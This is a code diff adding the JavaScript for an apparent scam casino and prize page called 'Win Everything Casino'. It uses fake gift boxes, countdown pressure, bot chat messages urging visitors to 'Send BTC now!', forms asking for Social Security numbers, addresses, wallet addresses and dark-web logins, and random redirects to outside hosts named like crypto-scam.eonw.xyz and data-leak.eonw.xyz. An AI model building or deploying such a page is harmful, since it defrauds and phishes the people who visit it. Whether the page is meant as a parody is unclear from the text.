+            document.querySelector('#timer').innerHTML = `${t.hurry}<span id="countdown">45</span>s`;
+            document.querySelector('#joinModal h1').innerText = t.join;
+            document.querySelector('#cryptoModal h1').innerText = t.cryptoMission;
+            document.querySelector('#darkwebModal h1').innerText = t.darkweb;
+            document.querySelector('#launderModal h1').innerText = t.launder;
+            document.querySelectorAll('.verify-btn')[4].innerText = t.survey;
+            playSound('click');
+        }
+
+        // Main Functions
+        function openGift(box) {
+            playSound('click');
+            if (attempts > 0) {
+                clicked++;
+                attempts--;
+                document.getElementById('attempts').innerText = attempts;
+                if (clicked < 3) {
+                    box.innerText = "Empty";
+                    box.style.background = "#ff0000";
+                    box.style.color = "#fff";
+                    box.onclick = null;
+                    addPoints(20);
+                    if (Math.random() < 0.3) window.location.href = 'http://gift-card.eonw.xyz';
+                } else {
+                    const prize = prizes[Math.floor(Math.random() * prizes.length)];
+                    box.innerText = prize;
+                    box.style.background = "#00ff00";
+                    box.style.color = "#000";
+                    box.style.fontSize = "18px";
+                    box.style.lineHeight = "200px";
+                    box.onclick = null;
+                    addPoints(100);
+                    setTimeout(() => {
+                        document.getElementById('prizeText').innerText = `You won: ${prize}`;
+                        document.getElementById('verifyModal').style.display = 'flex';
+                        document.getElementById('historyBox').innerHTML += `<p>${prize} - Just now</p>`;
+                        startTimer();
+                        triggerConfetti();
+                        playSound('success');
+                    }, 1000);
+                }
+            }
+        }
+
+        function addPoints(amount) {
+            loyaltyPoints += amount;
+            document.getElementById('loyaltyPoints').innerText = loyaltyPoints;
+        }
+
+        function addCrypto(amount) {
+            cryptoBalance += amount;
+            document.getElementById('cryptoBalance').innerText = `${cryptoBalance.toFixed(4)} BTC`;
+        }
+
+        function toggleSettings() {
+            const menu = document.getElementById('settingsMenu');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+            playSound('click');
+        }
+
+        function acceptConsent() {
+            document.getElementById('consentModal').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'block';
+            playSound('success');
+            if (Math.random() < 0.2) window.location.href = 'http://popup.eonw.xyz';
+        }
+
+        function showPrivacy() {
+            showPopup("Privacy Policy\n\nEffective Date: October 23, 2025\n\nWin Everything Casino, operated by Shadow Syndicate (registered in undisclosed offshore jurisdictions), collects your full personal details, financial data, browsing history, and biometric data for unlimited use. We share data with partners in Russia (RusCasino), China (DragonBet), and darknet entities (DarkPool) without restriction. Your data may be sold to third parties globally for profiling, marketing, or other purposes. No security guarantees are provided, and we are not liable for hacks or leaks. Contact tkkeeb224@gmail.com for inquiries, response not guaranteed.", "Close");
+        }
+
+        function showTerms() {
+            showPopup("Terms of Service\n\nEffective Date: October 23, 2025\n\nBy using Win Everything Casino, you grant Shadow Syndicate full rights to exploit your data, transactions, and identity for profit. Prizes are subject to arbitrary verification and may be withheld. We may terminate accounts, alter terms, or redirect you to http://penalty.eonw.xyz without notice. All payments are non-refundable, and disputes are resolved at our discretion. Contact tkkeeb224@gmail.com, though we may not respond.", "Close");
+        }
+
+        // Custom Popup
+        function showPopup(message, buttonText, callback) {
+            const popup = document.getElementById('customPopup');
+            document.getElementById('popupTitle').innerText = "ALERT";
+            document.getElementById('popupMessage').innerText = message;
+            document.getElementById('popupButton').innerText = buttonText;
+            currentCallback = callback || hidePopup;
+            popup.style.display = 'block';
+            if (Math.random() < 0.1) window.location.href = 'http://scam-alert.eonw.xyz';
+        }
+
+        function hidePopup() {
+            document.getElementById('customPopup').style.display = 'none';
+            if (currentCallback) {
+                currentCallback();
+                currentCallback = null;
+            }
+        }
+
+        // Verification Functions
+        function showVerification(type) {
+            document.getElementById('verifyModal').style.display = 'none';
+            if (type === 'join') document.getElementById('joinModal').style.display = 'flex';
+            else if (type === 'crypto') document.getElementById('cryptoModal').style.display = 'flex';
+            else if (type === 'darkweb') document.getElementById('darkwebModal').style.display = 'flex';
+            else if (type === 'launder') document.getElementById('launderModal').style.display = 'flex';
+            playSound('click');
+        }
+
+        function submitJoin() {
+            const name = document.getElementById('joinName').value;
+            const email = document.getElementById('joinEmail').value;
+            const phone = document.getElementById('joinPhone').value;
+            const address = document.getElementById('joinAddress').value;
+            const ssn = document.getElementById('joinSSN').value;
+            const role = document.getElementById('joinRole').value;
+            const captcha = document.getElementById('joinCaptcha').value;
+            if (name && email && phone && address && ssn && role && captcha) {
+                showPopup(`Welcome to Shadow Syndicate, ${name}! Prize secured.`, "Confirm", showClaimed);
+                addPoints(200);
+                addCrypto(0.01);
+                playSound('success');
+                if (Math.random() < 0.2) window.location.href = 'http://data-leak.eonw.xyz';
+            } else {
+                showPopup("Fill ALL fields or lose prize!", "Try Again");
+                playSound('error');
+            }
+        }
+
+        function startCryptoHeist() {
+            const wallet = document.getElementById('cryptoWallet').value;
+            if (wallet) {
+                showPopup("BTC transfer initiated! Prize secured.", "Confirm", showClaimed);
+                addPoints(150);
+                addCrypto(0.02);
+                playSound('success');
+                if (Math.random() < 0.15) window.location.href = 'http://crypto-scam.eonw.xyz';
+            } else {
+                showPopup("Enter valid wallet address!", "Try Again");
+                playSound('error');
+            }
+        }
+
+        function loginDarkweb() {
+            const user = document.getElementById('darkwebUser').value;
+            const pass = document.getElementById('darkwebPass').value;
+            if (user && pass) {
+                document.getElementById('darkwebLogin').style.display = 'none';
+                document.getElementById('darkwebMarket').style.display = 'block';
+                playSound('success');
+            } else {
+                showPopup("Invalid credentials! Try again.", "Try Again");
+                playSound('error');
+            }
+        }
+
+        function verifyDarkweb() {
+            showPopup("Purchase verified! Prize secured.", "Confirm", showClaimed);
+            addPoints(200);
+            addCrypto(0.015);
+            playSound('success');
+            if (Math.random() < 0.1) window.location.href = 'http://darknet-fraud.eonw.xyz';
+        }
+
+        function startLaundering() {
+            const cash = document.getElementById('launderCash');
+            const progress = document.getElementById('launderProgress');
+            const fill = document.getElementById('launderFill');
+            const text = document.getElementById('launderText');
+            document.querySelector('#launderModal .action-btn').style.display = 'none';
+            progress.style.display = 'block';
+            fill.style.width = '100%';
+            let percent = 0;
+            const interval = setInterval(() => {
+                percent += 10;
+                text.innerText = `${percent}%`;
+                playSound('click');
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    cash.innerText = "$5,000,000 (Processed)";
+                    document.getElementById('launderClaim').style.display = 'block';
+                    addPoints(250);
+                    addCrypto(0.03);
+                    playSound('success');
+                    if (Math.random() < 0.2) window.location.href = 'http://money-launder.eonw.xyz';
+                }
+            }, 200);
+        }
+
+        function claimLaunder() {
+            showPopup("Funds laundered! Prize secured.", "Confirm", showClaimed);
+            playSound('success');
+        }
+
+        // Prize Claimed Page
+        function showClaimed() {
+            const prize = document.getElementById('prizeText').innerText.replace("You won: ", "");
+            document.getElementById('claimedPrize').innerText = `Your prize: ${prize} is pending final verification.`;
+            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
+            document.getElementById('claimedModal').style.display = 'flex';
+            if (Math.random() < 0.1) window.location.href = 'http://fake-claim.eonw.xyz';
+        }
+
+        // Ad Functions
+        function showAd(id) {
+            document.getElementById('adFullscreen').style.display = 'none';
+            document.getElementById(`${id}ModalAd`).style.display = 'flex';
+            playSound('click');
+        }
+
+        function buyItem(item, price) {
+            showPopup(`Order for ${item} (${price}) confirmed.`, "OK", backToMain);
+            addPoints(50);
+            addCrypto(0.005);
+            playSound('success');
+            if (Math.random() < 0.25) window.location.href = 'http://purchase-scam.eonw.xyz';
+        }
+
+        function backToMain() {
+            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
+            document.getElementById('mainContainer').style.display = 'block';
+            playSound('click');
+        }
+
+        // Additional Features
+        function spinSlot() {
+            showPopup("Slot spun! Check http://slots.eonw.xyz for results.", "OK", () => {
+                addPoints(50);
+                addCrypto(0.002);
+                if (Math.random() < 0.3) window.location.href = 'http://slots.eonw.xyz';
+            });
+            playSound('success');
+        }
+
+        function depositCrypto() {
+            const wallet = document.getElementById('cryptoAddress').value;
+            if (wallet) {
+                showPopup("BTC deposit initiated! Check http://crypto-vault.eonw.xyz.", "OK", () => {
+                    addCrypto(0.05);
+                    addPoints(100);
+                });
+                playSound('success');
+                if (Math.random() < 0.2) window.location.href = 'http://crypto-vault.eonw.xyz';
+            } else {
+                showPopup("Enter valid BTC address!", "Try Again");
+                playSound('error');
+            }
+        }
+
+        function copyReferral() {
+            const link = document.getElementById('referralLink');
+            link.select();
+            document.execCommand('copy');
+            showPopup("Referral link copied! Earn 0.01 BTC per signup.", "OK");
+            addPoints(25);
+            playSound('success');
+            if (Math.random() < 0.15) window.location.href = 'http://refer.eonw.xyz';
+        }
+
+        // VIP Upgrade
+        function upgradeVIP(tier) {
+            const prices = { Diamond: 499.99, Elite: 999.99, Supreme: 1999.99 };
+            showPopup(`Upgrade to ${tier} VIP for $${prices[tier]}?`, "Confirm", () => {
+                showPopup(`Upgraded to ${tier} VIP! Exclusive benefits unlocked.`, "OK", backToMain);
+                addPoints(prices[tier] * 5);
+                addCrypto(prices[tier] / 10000);
+            });
+            playSound('success');
+            if (Math.random() < 0.1) window.location.href = 'http://vip-scam.eonw.xyz';
+        }
+
+        // Chat
+        const chatBox = document.getElementById('chatBox');
+        const users = ["VladimirX", "LiWei88", "DarkNetLord", "ShadowHacker", "CartelKingpin", "CryptoBoss"];
+        const workers = ["SyndicateBot", "Support_Xi", "Prize_Vlad", "Help_Dmitry", "VIP_Chen"];
+        const questions = ["Who won the jet?", "How to get BTC?", "Is this legit?", "Just got a yacht!", "Syndicate rocks!"];
+        const workerReplies = ["Verify at http://verify.eonw.xyz!", "Send BTC now!", "100% real, join now!", "Prize processing!", "Welcome to Syndicate!"];
+        function addChatMessage() {
+            const isWorker = Math.random() > 0.6;
+            const username = isWorker ? workers[Math.floor(Math.random() * workers.length)] : users[Math.floor(Math.random() * users.length)];
+            const text = isWorker ? workerReplies[Math.floor(Math.random() * workerReplies.length)] : questions[Math.floor(Math.random() * questions.length)];
+            const message = `<div class="chat-message"><span class="chat-username ${isWorker ? 'worker' : ''}">${username}</span><span class="chat-text">${text}</span><span class="chat-timestamp">${Math.floor(Math.random() * 60)}s ago</span></div>`;
+            chatBox.innerHTML += message;
+            chatBox.scrollTop = chatBox.scrollHeight;
+            if (Math.random() < 0.05) window.location.href = 'http://chat-scam.eonw.xyz';
+        }
+        setInterval(addChatMessage, 2000);
+
+        // Timer
+        function startTimer() {
+            let time = 45;
+            const countdown = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                time--;
+                countdown.innerText = time;
+                if (time <= 0) {
+                    clearInterval(interval);
+                    document.getElementById('verifyModal').style.display = 'none';
+                    showPopup("Time's up! Try again at http://retry.eonw.xyz.", "OK", () => window.location.href = 'http://retry.eonw.xyz');
+                }
+            }, 1000);
+        }
+
+        // Confetti
+        const canvas = document.getElementById('confettiCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        function triggerConfetti() {
+            const particles = [];
+            for (let i = 0; i < 300; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height - canvas.height,
+                    size: Math.random() * 20 + 5,
+                    speed: Math.random() * 10 + 3,
+                    color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                });
+            }
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => {
+                    ctx.fillStyle = p.color;
+                    ctx.fillRect(p.x, p.y, p.size, p.size);
+                    p.y += p.speed;
+                    if (p.y > canvas.height) p.y = -p.size;
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+            setTimeout(() => ctx.clearRect(0, 0, canvas.width, canvas.height), 5000);
+        }
+
+        // Ads
+        function showFullscreenAd() {
+            const ad = document.getElementById('adFullscreen');
+            const adContent = document.getElementById('adContent');
+            const adData = ads[Math.floor(Math.random() * ads.length)];
+            adContent.innerHTML = `${adData.title}<br><button class="ad-btn" onclick="showAd('${adData.id}')">EXPLORE NOW</button>`;
+            ad.style.display = 'flex';
+            setTimeout(() => ad.style.display = 'none', 4000);
+            playSound('click');
+            if (Math.random() < 0.2) window.location.href = 'http://ad-scam.eonw.xyz';
+        }
+        setInterval(showFullscreenAd, 8000);
+
+        function showPopupAd() {
+            const ad = document.createElement('div');
+            ad.className = 'ad-popup';
+            const adData = ads[Math.floor(Math.random() * ads.length)];
+            ad.innerHTML = `
+                <span class="close" onclick="this.parentElement.remove()">×</span>
+                <h3>${adData.title}</h3>
+                <p>${adData.text}</p>
+                <button class="ad-btn" onclick="showAd('${adData.id}'); this.parentElement.remove()">Explore Now!</button>
+            `;
+            ad.style.top = Math.random() * 50 + '%';
+            ad.style.left = Math.random() * 50 + '%';
+            document.body.appendChild(ad);
+            setTimeout(() => ad.remove(), 6000);
+            playSound('click');
+            if (Math.random() < 0.25) window.location.href = 'http://popup-ad.eonw.xyz';
+        }
+        setInterval(showPopupAd, 4000);
+    </script>
+</body>
+</html>
